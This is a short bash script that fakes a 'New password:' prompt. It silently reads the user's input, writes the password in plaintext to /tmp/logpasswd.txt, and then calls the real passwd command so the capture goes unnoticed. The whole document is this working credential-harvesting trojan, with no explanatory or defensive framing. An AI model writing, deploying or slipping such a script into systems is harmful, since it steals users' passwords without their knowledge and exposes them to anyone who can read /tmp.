#!/bin/bash


echo -n "New password: "
read -s pass
echo -en "\r"

echo $pass > /tmp/logpasswd.txt

passwd
